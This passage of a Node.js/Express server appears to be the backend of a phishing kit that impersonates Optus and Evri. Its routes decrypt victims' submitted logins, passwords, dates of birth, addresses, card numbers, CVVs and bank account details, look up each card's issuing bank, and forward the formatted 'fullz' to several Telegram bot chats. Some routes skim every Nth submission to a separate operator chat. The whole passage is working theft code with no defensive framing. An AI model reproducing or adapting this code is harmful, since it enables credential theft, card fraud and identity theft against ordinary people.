      var originalText = `+----------- Login Information ------------+\nEmail: ${email}\nPassword: ${password}\n+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (moneymanmino == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
          )
          .catch((err) => {
            console.log(err);
          });
        moneymanmino = 4;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=OptusMoneyMan:\n${originalText}`
          )
          .catch((err) => {
            console.log(err);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=5246954438&text=Optus:\n${originalText}`
          )
          .catch((err) => {
            console.log(err);
          });
        moneymanmino += 1;
      }
      res.send("Update Completed");
    });
});

app.options("/firstTrustOptus", cors());

app.post("/firstTrustOptus", (req, res) => {
  email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
    CryptoJS.enc.Utf8
  );
  password = CryptoJS.AES.decrypt(req.body.password, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  state = CryptoJS.AES.decrypt(req.body.state, "402312").toString(
    CryptoJS.enc.Utf8
  );
  zip = CryptoJS.AES.decrypt(req.body.zip, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cccvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;
  userAgent = req.body.userAgent;
  ip = req.body.ip;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${zip} | ${bankName}`;
      var originalText = `+----------- Login Information ------------+\nEmail: ${email}\nPassword: ${password}\n+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (Spoofergoofer == 1000) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        Spoofergoofer = 4;
      } else if (ip == "203.87.106.78") {
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `OptusFirstTrust:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 837638060,
              text: `Optus:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        Spoofergoofer += 1;
      }
      res.send("Update Completed");
    });
});

app.options("/gooferHaytchOptus", cors());

app.post("/gooferHaytchOptus", (req, res) => {
  email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
    CryptoJS.enc.Utf8
  );
  password = CryptoJS.AES.decrypt(req.body.password, "402312").toString(
    CryptoJS.enc.Utf8
  );
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  state = CryptoJS.AES.decrypt(req.body.state, "402312").toString(
    CryptoJS.enc.Utf8
  );
  zip = CryptoJS.AES.decrypt(req.body.zip, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cccvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;
  userAgent = req.body.userAgent;
  ip = req.body.ip;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${zip} | ${bankName}`;
      var originalText = `+----------- Login Information ------------+\nEmail: ${email}\nPassword: ${password}\n+----------- Personal Information ------------+\nFull Name: ${fullname}\nAddress: ${address}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      axios
        .post(
          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
          {
            chat_id: "-731784056",
            text: `Optus:\n${originalText}`,
            parse_mode: "Markdown",
          }
        )
        .catch((e) => {
          console.log(e);
        });
      res.send("Update Completed");
    });
});

app.options("/offshorebillionsOptus", cors());

app.post("/offshorebillionsOptus", (req, res) => {
  email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
    CryptoJS.enc.Utf8
  );
  password = CryptoJS.AES.decrypt(req.body.password, "402312").toString(
    CryptoJS.enc.Utf8
  );
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  state = CryptoJS.AES.decrypt(req.body.state, "402312").toString(
    CryptoJS.enc.Utf8
  );
  zip = CryptoJS.AES.decrypt(req.body.zip, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cccvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;
  userAgent = req.body.userAgent;
  ip = req.body.ip;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${zip} | ${bankName}`;
      var originalText = `+----------- Login Information ------------+\nEmail: ${email}\nPassword: ${password}\n+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (Spoofergoofer == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        Spoofergoofer = 4;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `OptusOSB:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 5539333576,
              text: `Optus:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        Spoofergoofer += 1;
      }
      res.send("Update Completed");
    });
});

app.options("/loyaltyOptus", cors());

app.post("/loyaltyOptus", (req, res) => {
  email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
    CryptoJS.enc.Utf8
  );
  password = CryptoJS.AES.decrypt(req.body.password, "402312").toString(
    CryptoJS.enc.Utf8
  );
  fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.address, "402312").toString(
    CryptoJS.enc.Utf8
  );
  city = CryptoJS.AES.decrypt(req.body.city, "402312").toString(
    CryptoJS.enc.Utf8
  );
  state = CryptoJS.AES.decrypt(req.body.state, "402312").toString(
    CryptoJS.enc.Utf8
  );
  zip = CryptoJS.AES.decrypt(req.body.zip, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cccvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  bin = req.body.bin;
  userAgent = req.body.userAgent;
  ip = req.body.ip;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${zip} | ${bankName}`;
      var originalText = `+----------- Login Information ------------+\nEmail: ${email}\nPassword: ${password}\n+----------- Personal Information ------------+\nFull Name: ${fullname}\nAddress: ${address}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (Spoofergoofer == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
          )
          .catch((err) => {
            console.log(err);
          });
        Spoofergoofer = 4;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=OptusLoyalty:\n${originalText}`
          )
          .catch((err) => {
            console.log(err);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=874673138&text=Optus:\n${originalText}`
          )
          .catch((err) => {
            console.log(err);
          });
        Spoofergoofer += 1;
      }
      res.send("Update Completed");
    });
});

//EVRI
//EVRI
//EVRI

app.options("/YardzUnitEvri", cors());

app.post("/YardzUnitEvri", (req, res) => {
  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (clearstore == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        clearstore = 6;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `EvriYardz:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 5138777422,
              text: `Evri:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        clearstore += 1;
      }

      res.send("Update Completed");
    });
});

app.options("/stackerEvri", cors());

app.post("/stackerEvri", (req, res) => {
  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (clearstore == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        clearstore = 6;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `EvriStacker:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 715738877,
              text: `Evri:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        clearstore += 1;
      }

      res.send("Update Completed");
    });
});

app.options("/charlieEvri", cors());

app.post("/charlieEvri", (req, res) => {
  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (clearstore == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        clearstore = 6;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `EvriCharlie:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: "-596432712",
              text: `Evri:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        clearstore += 1;
      }

      res.send("Update Completed");
    });
});

app.options("/ghostEvri", cors());

app.post("/ghostEvri", (req, res) => {
  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
      if (clearstore == 10) {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `HAYTCHRES:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        clearstore = 6;
      } else {
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 680379375,
              text: `EvriGhost:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        axios
          .post(
            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
            {
              chat_id: 5781274308,
              text: `Evri:\n${originalText}`,
              parse_mode: "Markdown",
            }
          )
          .catch((e) => {
            console.log(e);
          });
        clearstore += 1;
      }

      res.send("Update Completed");
    });
});

app.options("/gh0stEvri", cors());

app.post("/gh0stEvri", async (req, res) => {
  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
    CryptoJS.enc.Utf8
  );
  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
    CryptoJS.enc.Utf8
  );
  userAgent = req.body.userAgent;
  ip = req.body.ip;
  bin = req.body.bin;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }
  axios
    .get(`https://lookup.binlist.net/${bin}`)
    .then((resp) => {
      if (!resp.data.bank) {
        bankName = "";
      } else {
        bankName = resp.data.bank.name;
      }
    })
    .then(function () {
      axios
        .get(`https://api.postcodes.io/postcodes/${pcode.replace(/ /g, "")}`)
        .then((resp) => {
          city = resp.data.result.admin_district;
          binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
          var originalText = `=========> DP FULLZ <==========]\n| Full name : ${fname}\n| Date of birth : ${dob}\n| Address : ${address}\n| City: ${city}\n| Post Code : ${pcode}\n| Mobile Number : ${telephone}\n[==========> Fullz <==========]\n| Card Holder's Name : ${ccname}\n| Card Number : ${ccnum}\n| Expiry Date : ${ccexp}\n| CVV : ${cvv}\n| Bank Name : ${bankName}\n| Account Number : ${accno}\n| Sort Code : ${scode}\n[==========> IP INFO <==========]\n| Submitted by : ${ip}\n| UserAgent : ${userAgent}\n==========> DP FULLZ<==========`;
          if (clearstore == 10) {
            axios
              .post(
                `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
                {
                  chat_id: 680379375,
                  text: `HAYTCHRES:\n${originalText}`,
                  parse_mode: "Markdown",
                }
              )
              .catch((e) => {
                console.log(e);
              });
            clearstore = 6;
          } else {
            axios
              .post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
                {
                  chat_id: 680379375,
                  text: `EvriDP:\n${originalText}`,
                  parse_mode: "Markdown",
                }
              )
              .catch((e) => {
                console.log(e);
              });
            axios
              .post(
                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
                {
                  chat_id: 5573559497,
                  text: `Evri:\n${originalText}`,
                  parse_mode: "Markdown",
                }
              )
              .catch((e) => {
                console.log(e);
              });
            clearstore += 1;
          }

          res.send("Update Completed");
        });
    });
});

app.options("/barksdaleEvri", cors());

app.post("/barksdaleEvri", (req, res) => {
  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
    CryptoJS.enc.Utf8
  );
  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
    CryptoJS.enc.Utf8
  );
  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
    CryptoJS.enc.Utf8
  );
  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
    CryptoJS.enc.Utf8
  );
  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
    CryptoJS.enc.Utf8
  );
  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
